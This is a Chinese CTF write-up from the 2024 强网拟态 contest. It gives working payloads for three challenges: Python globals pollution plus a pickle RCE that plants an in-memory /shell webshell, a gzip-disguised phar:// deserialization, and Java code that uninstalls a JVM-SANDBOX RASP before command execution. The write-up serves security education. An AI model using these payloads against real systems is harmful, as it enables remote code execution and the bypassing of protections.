---
title: 2024 强网拟态 Nepnep WP
contest: 强网拟态
year: 2024
difficulty: hard
vuln_type: [deserialize, rce, phar, jwt, sandbox_escape, web_unknown]
tags: [Python原型链污染, pickle reduce RCE, JWT secret_key 污染, phar:// 反序列化, gzip 绕 PILER, JVM-SANDBOX uninstall RASP, 内存马 app.add_route, 文件读取 capoo.phar]
attack_chain: ez_picker: /register JSON __init__.__globals__ 污染 safe_modules/safe_names/secret_key → pickle reduce eval() 写内存马 add_route('/shell') → 上传 1.pkl 触发 → /shell?cmd=cat /tr3e_fl4g_1s_h3re_lol ; capoo: file_get_contents 读 showpic.php 源码 → phar:// + gzip 压缩 GIF89a stub 绕 PILER 检测 → phar:// 反序列化 __wakeup + diff 读 flag ; OnlineRunner: java 不 import 类直接 java.io.FileReader 列目录 → 读 app.jar → 反编译 agent.jar → 调用 com.alibaba.jvm.sandbox.agent.AgentLauncher uninstall RASP → Runtime.exec 通杀
key_payload: {"username": 1, "password": 1, "__init__": {"__globals__": {"safe_modules": ["os", "builtins"], "safe_names": ["eval", "popen"], "secret_key": 111}}} ; pickle (eval, ('app.add_route(lambda request: __import__("os").popen(request.args.get("cmd")).read(), "/shell", methods=["GET", "POST"])',)) ; $phar->setStub("GIF89a"); gzcompress 改 .gif
one_liner: 原型链污染 + pickle 内存马 + phar:// 反序列化 + JVM-SANDBOX uninstall。
lesson: Python 原型链污染必须显式允许 safe_modules=['os','builtins'] 才有效；JVM-SANDBOX 启动时调用 uninstall() 可彻底关掉 RASP。
quality: high
---
# 2024 强网拟态 Nepnep WP

**最终排名：1st 🏆**

## 1. ez_picker（Python 原型链污染 + pickle 内存马）

```json
POST /register
{
    "username": 1,
    "password": 1,
    "__init__": {
        "__globals__": {
            "safe_modules": ["os", "builtins"],
            "safe_names": ["eval", "popen"],
            "secret_key": 111
        }
    }
}
```

通过 `__init__.__globals__` 把 `safe_modules` 改成 `['os','builtins']`、`safe_names` 改成 `['eval','popen']`、`secret_key` 改成 `111`（便于伪造 JWT）。

**pickle 内存马**：
```python
import pickle
class A:
    def __reduce__(self):
        return (eval, ('app.add_route(lambda request: __import__("os").popen(request.args.get("cmd")).read(),"/shell", methods=["GET","POST"])',))
b = pickle.dumps(A())
```

上传到 `/upload` → 服务端 `pickle.loads` 触发 → 加路由 `/shell?cmd=...`。

**伪造 JWT token**：
```python
import jwt, time
from key import secret_key
data = {"user": 1, "role": "admin", "exp": int(time.time())+300}
token = jwt.encode(data, str(secret_key), algorithm='HS256')
```

`GET /shell?cmd=cat /tr3e_fl4g_1s_h3re_lol` → flag。

## 2. capoo（PHP phar:// + gzip 绕 PILER）

读 `showpic.php` 源码：
```php
class CapooObj {
    public function __wakeup() {
        $action = str_replace(['"', "'"], '', $this->action);
        $banlist = "/(flag|php|base|cat|...)/i";
        if (preg_match($banlist, $action)) die("Not Allowed!");
        system($this->action);
    }
}
// 上传流程：file_exists → file_get_contents → 检测 PILER 字符串
```

**绕过**：
```php
$phar = new Phar('test.phar');
$phar->setStub("GIF89a");
$o = new CapooObj();
$o->action = 'whoami';
$phar->setMetadata($o);
$phar->addFromString("test.txt", "m1xi@n");
```

gzip 压缩 + 改后缀 `.gif` 绕 PILER 检测 → `capoo=http://ip:port/xxx.gif` 下载 → `phar://capoo_img/capoo.gif/test.txt` 触发 `__wakeup`。

## 3. OnlineRunner（Java 无 import RCE + JVM-SANDBOX uninstall）

题目禁止 `import`，但 java 全限定名可以用。

**列目录 / 读文件**：
```java
try {
    java.io.File folder = new java.io.File("/");
    java.io.File[] files = folder.listFiles();
    for (java.io.File f : files) System.out.println(f.getName());
} catch (Exception e) { e.printStackTrace(); }

try {
    java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(new java.io.FileInputStream("/app/app.jar"));
    java.util.zip.ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        System.out.println(entry.getName());
        zis.closeEntry();
    }
} catch (Exception e) { e.printStackTrace(); }
```

发现启动命令：
```
java --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar -jar /app/app.jar
```

**下载 agent.jar**（base64 输出）：
```java
java.io.File file = new java.io.File("/home/ctf/sandbox/lib/sandbox-agent.jar");
java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file));
byte[] buffer = new byte[1024];
int bytesRead;
while ((bytesRead = bis.read(buffer)) != -1) {
    System.out.print('"');
    System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));
    System.out.println('"');
}
```

逆向发现是 JVM-SANDBOX，`AgentLauncher` 类有 `uninstall()` 方法。

**Uninstall RASP**：
```java
Class agentLauncherClass = Class.forName("com.alibaba.jvm.sandbox.agent.AgentLauncher");
java.lang.reflect.Method uninstallMethod = agentLauncherClass.getMethod("uninstall");
uninstallMethod.invoke(null);
```

之后 `Runtime.getRuntime().exec("bash -c ...")` 直接通杀。
